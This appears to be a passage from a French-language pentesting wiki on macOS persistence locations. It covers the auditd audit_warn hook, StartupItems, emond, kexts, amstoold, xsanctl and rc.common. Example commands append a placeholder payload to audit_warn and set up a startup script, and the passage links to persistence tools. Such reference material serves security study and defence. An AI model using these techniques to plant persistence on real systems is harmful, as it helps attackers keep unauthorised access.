#### Description & Exploit

Chaque fois qu’auditd détecte un warning, le script **`/etc/security/audit_warn`** est **exécuté**. Vous pouvez donc y ajouter votre payload.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
You could force a warning with `sudo audit -n`.

### Éléments de démarrage

> [!CAUTION] > **Ceci est obsolète, aucun élément ne devrait donc être trouvé dans ces répertoires.**

Le **StartupItem** est un répertoire qui doit être placé dans `/Library/StartupItems/` ou `/System/Library/StartupItems/`. Une fois ce répertoire créé, il doit contenir deux fichiers spécifiques :

1. Un **script rc** : un shell script exécuté au démarrage.
2. Un **fichier plist**, nommé précisément `StartupParameters.plist`, qui contient différents paramètres de configuration.

Assurez-vous que le script rc et le fichier `StartupParameters.plist` sont correctement placés dans le répertoire **StartupItem** afin que le processus de démarrage puisse les reconnaître et les utiliser.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Je ne trouve pas ce composant sur mon macOS ; pour plus d’informations, consultez le writeup.

Writeup : [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introduit par Apple, **emond** est un mécanisme de journalisation qui semble sous-développé ou potentiellement abandonné, tout en restant accessible. Bien que ce service obscur ne soit pas particulièrement utile pour un administrateur Mac, il pourrait servir de méthode de persistence discrète pour des threat actors, probablement non détectée par la plupart des administrateurs macOS.

Pour ceux qui connaissent son existence, identifier toute utilisation malveillante de **emond** est simple. Le LaunchDaemon du système associé à ce service recherche des scripts à exécuter dans un répertoire spécifique. Pour l’inspecter, utilisez la commande suivante :
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Emplacement

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Droits root requis
- **Déclencheur** : avec XQuartz

#### Description et exploitation

XQuartz **n'est plus installé dans macOS**. Consultez donc le compte rendu pour plus d'informations.

### ~~kext~~

> [!CAUTION]
> Il est tellement compliqué d'installer un kext, même en tant que root, que je ne considérerai pas cette technique pour sortir d'une sandbox ni même pour assurer la persistance (sauf si vous disposez d'un exploit).

#### Emplacement

Pour installer un KEXT en tant qu'élément de démarrage, il doit être **installé dans l'un des emplacements suivants** :

- `/System/Library/Extensions`
- Fichiers KEXT intégrés au système d'exploitation OS X.
- `/Library/Extensions`
- Fichiers KEXT installés par des logiciels tiers

Vous pouvez lister les fichiers kext actuellement chargés avec :
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Pour plus d'informations sur les [**kernel extensions, consultez cette section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup : [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Emplacement

- **`/usr/local/bin/amstoold`**
- Root requis

#### Description & Exploitation

Apparemment, le `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` utilisait ce binary tout en exposant un service XPC... Le problème est que le binary n'existait pas, vous pouviez donc en placer un à cet emplacement et, lorsque le service XPC était appelé, votre binary était exécuté.

Je ne retrouve plus cet élément dans mon macOS.

### ~~xsanctl~~

Writeup : [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Emplacement

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root requis
- **Déclencheur** : lorsque le service est exécuté (rarement)

#### Description & exploit

Apparemment, ce script est rarement exécuté et je n'ai même pas réussi à le trouver dans mon macOS. Pour plus d'informations, consultez donc le writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Cela ne fonctionne pas dans les versions modernes de macOS**

Il est également possible de placer ici des **commands qui seront exécutées au démarrage.** Exemple de script rc.common standard :
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Techniques et outils de persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Références

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
